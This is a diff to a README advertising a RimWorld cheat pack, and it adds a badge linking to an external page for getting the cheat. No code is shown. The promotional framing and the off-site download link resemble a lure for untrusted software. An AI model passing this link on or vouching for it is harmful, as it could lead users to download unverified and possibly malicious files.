@@ -4,6 +4,7 @@
 
 **RimWorld** is a colony simulator that thrives on difficulty, survival challenges, and brutal RNG. But sometimes, you just want to skip the grind. That’s where the **RimWorld cheat pack** comes in – offering unlimited resources, god mode, instant builds, and mod menus that turn your colony into a utopia (or chaos, if that’s your style).
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://rimworld-cheat.github.io/.github/)
 ---
 
 ## Product Description
